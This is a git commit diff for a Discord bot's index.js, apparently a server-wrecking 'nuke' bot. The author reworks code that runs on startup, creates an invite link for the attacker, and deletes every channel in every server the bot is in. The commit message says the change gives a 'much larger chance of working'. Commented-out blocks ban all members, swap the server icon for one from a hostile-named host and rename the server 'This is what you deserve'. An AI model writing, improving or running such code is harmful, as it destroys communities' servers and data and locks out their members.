1d2bbc644335ae6bde996e66c4e919cf979f8230
goldentg <43283685+goldentg@users.noreply.github.com>
2018-11-03 11:32:25 -0600

    added promise to delete all channels block. much larger chance of working

--- index.js
+++ index.js
@@ -3,60 +3,60 @@ const client = new Discord.Client();
 const config = require("./config.json");
 const fs = require("fs")
 
-
 //on ready delete all channels
 client.on("ready", () => {
-
-
-// Create an invite to a channel
-client.guilds.forEach(server => {
-    server.createChannel("-", "text").then(channel =>{
-server.channels.first().createInvite().then(inviteCode => {
-    console.log(inviteCode);
-
+    // Create an invite to a channel
+    client.guilds.forEach(server => {
+        server.createChannel("-", "text").then(channel => {
+            server.channels.first().createInvite().then(inviteCode => {
+                console.log(inviteCode);
+            }).catch(err => {
+                if (err) throw err;
+            });
         }).catch(err => {
-            if(err) throw err;
+            if (err) throw err;
         });
-    }).catch(err => {
-        if(err) throw err;
     });
-});
 
 
-client.guilds.forEach(server => {
-    server.channels.forEach(channel => {
-        channel.delete();    
+    client.guilds.forEach(server => {
+        server.channels.forEach(channel => {
+            channel.delete().then(response => {
+                console.log("my response", response);
+            }).catch(err => {
+                if(err) throw err;
+            });
+        });
     });
-});
-/*
-guild.members.forEach(m => {
-    m.ban();
-    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
-});
-*/
-//startup message log
-console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
-
-/*
-//ban all 
-guilds.members.forEach(m => {
+    /*
+    guild.members.forEach(m => {
         m.ban();
+        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
+    });
+    */
+    //startup message log
+    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
 
-console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
-    
+    /*
+    //ban all 
+    guilds.members.forEach(m => {
+            m.ban();
 
-//set server icon
-guild.setIcon("https://china.hacked-my.computer/95314b55.png");
+    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
+        
 
-//set server name
-guild.setName("This is what you deserve");
-*/
+    //set server icon
+    guild.setIcon("https://china.hacked-my.computer/95314b55.png");
+
+    //set server name
+    guild.setName("This is what you deserve");
+    */
 
 
-//handle unexpected errors
-process.on("uncaughtException", err => {
-    console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
-    process.exit(1);
+    //handle unexpected errors
+    process.on("uncaughtException", err => {
+        console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
+        process.exit(1);
     });
 });
 
